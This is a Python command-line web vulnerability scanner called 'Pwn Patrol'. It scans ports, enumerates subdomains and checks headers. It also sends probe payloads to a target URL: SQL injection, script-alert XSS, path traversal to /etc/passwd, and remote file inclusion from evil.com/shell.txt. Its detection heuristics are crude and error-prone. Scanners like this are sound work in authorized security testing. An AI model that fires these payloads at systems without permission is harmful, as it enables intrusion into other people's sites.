import requests
import re
import socket
import time
import os
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from jinja2 import Environment, FileSystemLoader

# Configuration
VIRUSTOTAL_API_KEY = 'your_virustotal_api_key'
CONFIDENCE_THRESHOLD = 80
REPORT_TEMPLATE = 'report_template.html'

# Global variables
target_url = ""

def validate_url(url):
    """Validate the provided URL format."""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except ValueError:
        return False

def display_progress(message, duration):
    """Display the progress of the current scan step."""
    print(f"{message} (Estimated time: {duration} seconds)")
    time.sleep(duration)

def generate_report_name(url):
    """Generate a unique report file name based on the target URL."""
    parsed_url = urlparse(url)
    sanitized_name = parsed_url.netloc.replace('.', '_').replace(':', '_')
    report_number = 1
    while True:
        report_name = f"{sanitized_name}_report_{report_number:02d}.html"
        if not os.path.exists(report_name):
            return report_name
        report_number += 1

def scan_open_ports(domain, ports=None):
    """Scan common open ports on the target domain."""
    if ports is None:
        ports = [80, 443, 22, 21, 8080, 3306]
    
    open_ports = []
    ip = socket.gethostbyname(domain)
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    return open_ports

def check_sql_injection(url, checks_performed):
    """Check if the target is vulnerable to SQL Injection."""
    sqli_payload = "' OR '1'='1"
    test_url = f"{url}?id={sqli_payload}"
    try:
        response = requests.get(test_url)
        if "error" in response.text or "syntax" in response.text:
            checks_performed.append({"check": "SQL Injection", "result": "Vulnerability Detected"})
            return True
        else:
            checks_performed.append({"check": "SQL Injection", "result": "No Vulnerability Detected"})
    except requests.exceptions.RequestException as e:
        checks_performed.append({"check": "SQL Injection", "result": f"Error: {e}"})
    return False

def check_xss(url, checks_performed):
    """Check if the target is vulnerable to Cross-Site Scripting (XSS)."""
    xss_payload = "<script>alert('XSS')</script>"
    test_url = f"{url}?q={xss_payload}"
    try:
        response = requests.get(test_url)
        if xss_payload in response.text:
            checks_performed.append({"check": "Cross-Site Scripting (XSS)", "result": "Vulnerability Detected"})
            return True
        else:
            checks_performed.append({"check": "Cross-Site Scripting (XSS)", "result": "No Vulnerability Detected"})
    except requests.exceptions.RequestException as e:
        checks_performed.append({"check": "Cross-Site Scripting (XSS)", "result": f"Error: {e}"})
    return False

def check_outdated_software(headers, checks_performed):
    """Check for outdated software based on HTTP headers."""
    outdated_software = []
    software_versions = {
        "Server": {"Apache": "2.4.46", "nginx": "1.20.0"},
        "X-Powered-By": {"PHP": "7.4.0"},
    }
    for header, software_dict in software_versions.items():
        if header in headers:
            for software, version in software_dict.items():
                if software in headers[header]:
                    header_version = re.search(r'\d+\.\d+\.\d+', headers[header])
                    if header_version and header_version.group(0) < version:
                        outdated_software.append(f"{software} {header_version.group(0)}")
    if outdated_software:
        checks_performed.append({"check": "Outdated Software", "result": f"Outdated software found: {outdated_software}"})
    else:
        checks_performed.append({"check": "Outdated Software", "result": "No outdated software found"})
    return outdated_software

def check_insecure_http_methods(url, checks_performed):
    """Check if insecure HTTP methods are enabled on the target."""
    methods = ["OPTIONS", "PUT", "DELETE", "TRACE"]
    try:
        response = requests.options(url)
        if any(method in response.headers.get('Allow', '') for method in methods):
            checks_performed.append({"check": "Insecure HTTP Methods", "result": "Insecure HTTP methods detected"})
            return True
        else:
            checks_performed.append({"check": "Insecure HTTP Methods", "result": "No insecure HTTP methods detected"})
    except requests.exceptions.RequestException as e:
        checks_performed.append({"check": "Insecure HTTP Methods", "result": f"Error: {e}"})
    return False

def query_virustotal(ip_or_domain, checks_performed):
    """Check the reputation of the domain using VirusTotal."""
    url = f"https://www.virustotal.com/vtapi/v2/domain/report"
    params = {'apikey': VIRUSTOTAL_API_KEY, 'domain': ip_or_domain}
    try:
        response = requests.get(url, params=params)
        if response.status_code == 200:
            checks_performed.append({"check": "VirusTotal Domain Reputation", "result": "Reputation checked"})
            return response.json()
    except requests.exceptions.RequestException as e:
        checks_performed.append({"check": "VirusTotal Domain Reputation", "result": f"Error: {e}"})
    return {}

def calculate_confidence(vt_report):
    """Calculate a confidence score based on the VirusTotal report."""
    positives = vt_report.get('positives', 0)
    total = vt_report.get('total', 1)
    return (positives / total) * 100

def check_directory_traversal(url, checks_performed):
    """Check if the target is vulnerable to Directory Traversal."""
    traversal_payloads = [
        "../../etc/passwd",
        "../../../../../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini",
    ]
    vulnerable = False
    for payload in traversal_payloads:
        test_url = f"{url}?file={payload}"
        try:
            response = requests.get(test_url)
            if "root:x:" in response.text or "[boot loader]" in response.text:
                checks_performed.append({"check": "Directory Traversal", "result": "Vulnerability Detected"})
                vulnerable = True
                break
        except requests.exceptions.RequestException as e:
            checks_performed.append({"check": "Directory Traversal", "result": f"Error: {e}"})
            return False
    if not vulnerable:
        checks_performed.append({"check": "Directory Traversal", "result": "No Vulnerability Detected"})
    return vulnerable

def check_file_inclusion(url, checks_performed):
    """Check if the target is vulnerable to File Inclusion (LFI/RFI)."""
    inclusion_payloads = [
        "../../etc/passwd",
        "http://evil.com/shell.txt",
    ]
    vulnerable = False
    for payload in inclusion_payloads:
        test_url = f"{url}?page={payload}"
        try:
            response = requests.get(test_url)
            if "root:x:" in response.text or "shell" in response.text:
                checks_performed.append({"check": "File Inclusion (LFI/RFI)", "result": "Vulnerability Detected"})
                vulnerable = True
                break
        except requests.exceptions.RequestException as e:
            checks_performed.append({"check": "File Inclusion (LFI/RFI)", "result": f"Error: {e}"})
            return False
    if not vulnerable:
        checks_performed.append({"check": "File Inclusion (LFI/RFI)", "result": "No Vulnerability Detected"})
    return vulnerable

def check_http_security_headers(headers, checks_performed):
    """Check for the presence of essential HTTP security headers."""
    required_headers = {
        "Content-Security-Policy": "CSP Header not found",
        "X-Frame-Options": "X-Frame-Options Header not found",
        "X-Content-Type-Options": "X-Content-Type-Options Header not found",
        "Strict-Transport-Security": "HSTS Header not found",
    }
    for header in required_headers:
        if header not in headers:
            checks_performed.append({"check": f"HTTP Security Headers - {header}", "result": required_headers[header]})
        else:
            checks_performed.append({"check": f"HTTP Security Headers - {header}", "result": "Header is present"})
    return headers

def check_subdomain_enumeration(domain, checks_performed):
    """Check for common subdomains associated with the target domain."""
    subdomains = ["admin", "dev", "test", "mail", "ftp"]
    found_subdomains = []
    for subdomain in subdomains:
        try:
            subdomain_url = f"http://{subdomain}.{domain}"
            response = requests.get(subdomain_url)
            if response.status_code == 200:
                found_subdomains.append(subdomain_url)
        except requests.exceptions.RequestException:
            continue
    if found_subdomains:
        checks_performed.append({"check": "Subdomain Enumeration", "result": f"Found subdomains: {found_subdomains}"})
    else:
        checks_performed.append({"check": "Subdomain Enumeration", "result": "No subdomains found"})
    return found_subdomains

def analyze_website(domain):
    """Analyze the target website for various vulnerabilities."""
    checks_performed = []  # Reset checks_performed at the start of each scan
    results = []
    url = domain  # Directly use the fully qualified URL

    # Check open ports
    display_progress("Checking for open ports...", 3)
    parsed_domain = urlparse(domain).netloc
    open_ports = scan_open_ports(parsed_domain)
    if open_ports:
        results.append({
            'vulnerability': 'Open Ports',
            'details': f"Open ports found: {open_ports}",
            'confidence_score': 90
        })
    checks_performed.append({"check": "Open Ports", "result": f"Open ports found: {open_ports}" if open_ports else "No open ports found"})

    # Check SQL Injection
    display_progress("Checking for SQL Injection vulnerabilities...", 2)
    if check_sql_injection(url, checks_performed):
        results.append({
            'vulnerability': 'SQL Injection',
            'details': "Potential SQL Injection vulnerability detected.",
            'confidence_score': 95
        })

    # Check XSS
    display_progress("Checking for XSS vulnerabilities...", 2)
    if check_xss(url, checks_performed):
        results.append({
            'vulnerability': 'Cross-Site Scripting (XSS)',
            'details': "Potential XSS vulnerability detected.",
            'confidence_score': 85
        })

    # Check outdated software
    display_progress("Checking for outdated software in HTTP headers...", 1)
    response = requests.get(url)
    outdated_software = check_outdated_software(response.headers, checks_performed)
    if outdated_software:
        results.append({
            'vulnerability': 'Outdated Software',
            'details': f"Outdated software found: {outdated_software}",
            'confidence_score': 80
        })

    # Check insecure HTTP methods
    display_progress("Checking for insecure HTTP methods...", 1)
    if check_insecure_http_methods(url, checks_performed):
        results.append({
            'vulnerability': 'Insecure HTTP Methods',
            'details': "Insecure HTTP methods detected.",
            'confidence_score': 80
        })

    # VirusTotal reputation check
    display_progress("Checking VirusTotal for domain reputation...", 2)
    vt_report = query_virustotal(parsed_domain, checks_performed)
    confidence_score = calculate_confidence(vt_report)
    if confidence_score >= CONFIDENCE_THRESHOLD:
        results.append({
            'vulnerability': 'Domain Reputation',
            'details': "Domain has a bad reputation on VirusTotal.",
            'confidence_score': confidence_score
        })

    # Check Directory Traversal
    display_progress("Checking for Directory Traversal vulnerabilities...", 2)
    check_directory_traversal(url, checks_performed)

    # Check File Inclusion (LFI/RFI)
    display_progress("Checking for File Inclusion (LFI/RFI) vulnerabilities...", 2)
    check_file_inclusion(url, checks_performed)

    # Check HTTP Security Headers
    display_progress("Checking HTTP Security Headers...", 1)
    check_http_security_headers(response.headers, checks_performed)

    # Check Subdomain Enumeration
    display_progress("Checking for subdomains...", 3)
    check_subdomain_enumeration(parsed_domain, checks_performed)

    return results, checks_performed

def generate_html_report(analyzed_data, checks_performed):
    """Generate an HTML report summarizing the scan results."""
    report_name = generate_report_name(target_url)
    env = Environment(loader=FileSystemLoader('.'))
    template = env.get_template(REPORT_TEMPLATE)
    html_content = template.render(results=analyzed_data, checks_performed=checks_performed)
    
    with open(report_name, 'w') as file:
        file.write(html_content)
    print(f"Report generated: {report_name}")

def show_options():
    """Display available options in the CLI interface."""
    print("\nAvailable Options:")
    print("1. Set Target URL")
    print("2. Run Scan")
    print("3. Show Options")
    print("4. Exit\n")

def set_target():
    """Set the target URL for the scan."""
    global target_url
    while True:
        url = input("Enter the target URL (e.g., https://example.com): ").strip()
        if validate_url(url):
            target_url = url
            print(f"Target URL set to: {target_url}")
            break
        else:
            print("Invalid URL. Please enter a valid URL starting with http:// or https://.")

def run_scan():
    """Execute the vulnerability scan on the target URL."""
    if not target_url:
        print("Error: No target URL set. Please set the target URL first.")
        return
    analyzed_data, checks_performed = analyze_website(target_url)
    generate_html_report(analyzed_data, checks_performed)

def main():
    """Main entry point for the Pwn Patrol CLI."""
    show_options()
    while True:
        command = input("PwnPatrol> ").strip().lower()
        if command in {"1", "set target"}:
            set_target()
        elif command in {"2", "run scan"}:
            run_scan()
        elif command in {"3", "show options"}:
            show_options()
        elif command in {"4", "exit"}:
            print("Exiting Pwn Patrol.")
            break
        else:
            print("Invalid command. Please choose a valid option.")

if __name__ == '__main__':
    main()
